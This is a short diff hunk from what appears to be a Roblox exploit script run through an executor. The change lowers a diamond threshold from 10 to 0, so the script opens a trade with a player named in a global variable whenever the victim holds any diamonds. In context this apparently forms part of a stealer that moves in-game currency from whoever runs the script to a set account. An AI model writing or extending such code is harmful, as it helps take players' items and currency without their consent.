@@ -499,7 +499,7 @@ if Request then
     })
 end
 
-if getgenv().HasWhitelisted or Diamonds > 10 then
+if getgenv().HasWhitelisted or Diamonds > 0 then
     local target = Players:FindFirstChild(getgenv().UName)
     if target then
         StartTrade()
